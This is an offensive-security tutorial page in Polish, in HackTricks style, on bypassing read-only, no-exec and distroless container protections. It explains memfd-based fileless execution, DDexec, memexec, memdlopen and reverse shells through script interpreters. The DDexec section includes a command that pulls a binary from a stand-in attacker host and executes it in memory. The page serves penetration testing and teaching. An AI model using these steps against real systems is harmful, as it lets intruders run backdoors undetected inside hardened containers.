# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Filmy

W poniższych filmach znajdziesz dokładniejsze wyjaśnienie technik wspomnianych na tej stronie:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## scenariusz read-only / no-exec

Coraz częściej można spotkać maszyny linuksowe zamontowane z ochroną systemu plików **read-only (ro)**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z systemem plików ro jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc stwierdzenie, że nie możemy nic zapisać na dysku, jest nieprawdziwe. Ten katalog będzie jednak **zamontowany z ochroną no-exec**, więc jeśli pobierzesz tutaj plik binarny, **nie będziesz w stanie go wykonać**.

> [!WARNING]
> Z perspektywy red teamu utrudnia to **pobieranie i wykonywanie** plików binarnych, których nie ma już w systemie (takich jak backdoory lub enumeratory, np. `kubectl`).

## Najprostszy bypass: skrypty

Zwróć uwagę, że wspomniałem o plikach binarnych — możesz **wykonać dowolny skrypt**, o ile interpreter znajduje się na maszynie, na przykład **skrypt powłoki**, jeśli dostępne jest `sh`, lub **skrypt** **Pythona**, jeśli zainstalowany jest `python`.

Nie wystarczy to jednak do wykonania binarnego backdoora ani innych narzędzi binarnych, które mogą być potrzebne.

## Bypasses pamięci

Jeśli chcesz wykonać plik binarny, ale system plików na to nie pozwala, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **te zabezpieczenia nie mają tam zastosowania**.

### FD + bypass syscall exec

Jeśli na maszynie są dostępne zaawansowane silniki skryptowe, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać plik binarny do wykonania z pamięci, przechować go w deskryptorze pliku pamięci (`create_memfd` syscall), który nie będzie objęty tymi zabezpieczeniami, a następnie wywołać **`exec` syscall**, wskazując **fd jako plik do wykonania**.

Możesz w tym celu łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu plik binarny, a wygeneruje skrypt we wskazanym języku zawierający **skompresowany i zakodowany za pomocą b64 plik binarny**, wraz z instrukcjami **zdekodowania i dekompresji go** do **fd** utworzonego przez wywołanie `create_memfd` syscall oraz wywołania **exec** syscall w celu jego uruchomienia.

> [!WARNING]
> Nie działa to w innych językach skryptowych, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu wywoływania raw syscalls** ze skryptu, więc nie można wywołać `create_memfd`, aby utworzyć **memory fd** do przechowania pliku binarnego.
>
> Ponadto utworzenie **zwykłego fd** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będzie można go uruchomić — zadziała **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika pozwalająca **modyfikować pamięć własnego procesu** poprzez nadpisanie jego **`/proc/self/mem`**.

Dzięki kontrolowaniu kodu asemblera wykonywanego przez proces możesz zapisać **shellcode** i „zmutować” proces, aby **wykonał dowolny kod**.

> [!TIP]
> **DDexec / EverythingExec** pozwala załadować i **wykonać** własny **shellcode** lub **dowolny plik binarny** z **pamięci**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Więcej informacji o tej technice znajdziesz na Githubie lub:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. Jest to **DDexec shellcode uruchomiony jako daemon**, więc za każdym razem, gdy chcesz **uruchomić inny binary**, nie musisz ponownie uruchamiać DDexec — możesz po prostu uruchomić memexec shellcode za pomocą techniki DDexec, a następnie **komunikować się z tym daemonem, aby przekazywać mu nowe binary do załadowania i uruchomienia**.

Przykład użycia **memexec do wykonania binary z PHP reverse shell** znajdziesz na stronie [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Technika [**memdlopen**](https://github.com/arget13/memdlopen), mająca podobne zastosowanie do DDexec, umożliwia **łatwiejsze ładowanie binary** do pamięci, aby następnie je wykonać. Może nawet umożliwiać ładowanie binary wraz z zależnościami.

## Distroless Bypass

Aby uzyskać szczegółowe wyjaśnienie, **czym właściwie jest distroless**, kiedy pomaga, kiedy nie oraz jak zmienia post-exploitation tradecraft w kontenerach, sprawdź:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Czym jest distroless

Kontenery distroless zawierają tylko **absolutne minimum komponentów niezbędnych do uruchomienia konkretnej aplikacji lub usługi**, takich jak biblioteki i zależności runtime, ale pomijają większe komponenty, takie jak package manager, shell czy narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie attack surface kontenerów poprzez eliminowanie niepotrzebnych komponentów** i minimalizowanie liczby podatności, które mogą zostać wykorzystane.

### Reverse Shell

W kontenerze distroless możesz **nie znaleźć nawet `sh` ani `bash`**, aby uzyskać zwykły shell. Nie znajdziesz również binary takich jak `ls`, `whoami`, `id`... ani niczego, czego zwykle używasz w systemie.

> [!WARNING]
> Dlatego **nie będziesz** w stanie uzyskać **reverse shell** ani **enumerate** systemu w zwykły sposób.

Jeśli jednak zaatakowany kontener uruchamia na przykład aplikację webową we Flasku, Python będzie zainstalowany, a zatem możesz uzyskać **Python reverse shell**. Jeśli uruchamia Node, możesz uzyskać Node rev shell — podobnie jak w przypadku praktycznie dowolnego **języka skryptowego**.

> [!TIP]
> Używając języka skryptowego, możesz **enumerate system** za pomocą jego możliwości.

Jeśli nie ma zabezpieczeń **`read-only/no-exec`**, możesz wykorzystać swój reverse shell do **zapisania binary w systemie plików** i **ich wykonania**.

> [!TIP]
> Jednak w tego rodzaju kontenerach te zabezpieczenia zwykle istnieją, ale możesz użyć **wcześniejszych technik memory execution, aby je obejść**.

Przykłady tego, jak **wykorzystać niektóre podatności RCE**, aby uzyskać **reverse shelle** w językach skryptowych i wykonywać binary z pamięci, znajdziesz na stronie [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
